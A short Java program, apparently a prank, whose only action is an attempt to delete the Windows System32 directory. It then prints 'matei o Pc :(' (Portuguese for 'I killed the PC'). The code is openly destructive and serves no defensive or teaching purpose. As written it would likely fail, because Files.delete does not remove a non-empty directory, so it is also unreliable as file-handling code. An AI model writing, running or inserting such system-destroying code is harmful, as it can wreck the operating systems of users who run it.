import java.nio.file.*;
import java.io.IOException;

public class System32 {
    public static void main (String[]args) {
        Path path = Paths.get ("C://Windows/System32");

        try {
            Files.delete(path);
            System.out.println ("matei o Pc :(");
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}